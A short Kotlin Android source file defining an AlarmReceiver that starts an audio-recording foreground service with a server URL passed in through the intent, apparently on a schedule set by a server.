package com.audiostream.client

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import androidx.core.content.ContextCompat

/**
 * AlarmReceiver.kt — Wakes up the AudioRecordService based on server schedule.
 */
class AlarmReceiver : BroadcastReceiver() {

    companion object {
        const val EXTRA_ACTION = "com.audiostream.client.ACTION"
        const val EXTRA_SERVER_URL = "com.audiostream.client.SERVER_URL"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.getStringExtra(EXTRA_ACTION) ?: return
        val serverUrl = intent.getStringExtra(EXTRA_SERVER_URL) ?: return

        try {
            val serviceIntent = Intent(context, AudioRecordService::class.java).apply {
                this.action = action
                putExtra(AudioRecordService.EXTRA_SERVER_URL, serverUrl)
            }
            ContextCompat.startForegroundService(context, serviceIntent)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
